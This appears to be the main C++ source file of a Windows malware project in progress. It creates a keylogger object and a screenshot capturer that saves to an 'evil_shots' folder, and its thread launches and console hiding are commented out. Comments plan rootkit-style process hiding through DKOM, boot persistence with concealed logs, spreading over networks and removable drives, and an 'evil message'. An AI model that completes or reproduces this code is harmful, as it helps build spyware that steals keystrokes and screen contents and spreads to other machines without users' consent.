#include <Windows.h>
#include <iostream>
#include <vector>
#include <thread>

#include "KeyLogger.h"
#include "ScreenCapturer.h"

int main()
{
	//ShowWindow(GetConsoleWindow(), SW_HIDE);

	std::vector<std::thread> threads;

	// Keylogger
	KeyLogger keylogger("log.txt");
	//threads.push_back(std::thread(&KeyLogger::Deploy, &keylogger));
	
	// Screenshot capture
	ScreenCapturer paparazzi("evil_shots");
	//threads.push_back(std::thread(&ScreenCapturer::Deploy, &paparazzi));

	// Desktop changer class

	// Move the mouse a little on every mouse movement

	// process detacher driver (hide the pogan process from task manager/dkom to detech the eprocess)

	// Persistency actions (start on boot, put logfiles in a directory that is not expected, not deleted)

	// Spread over the network/via removable drivers
	
	// launch evil message in notepad

	Sleep(10000);
	keylogger.CleanUp();
	paparazzi.CleanUp();
	for (size_t i = 0; i < threads.size(); i++)
	{
		threads[i].join();
	}
	return 0;
}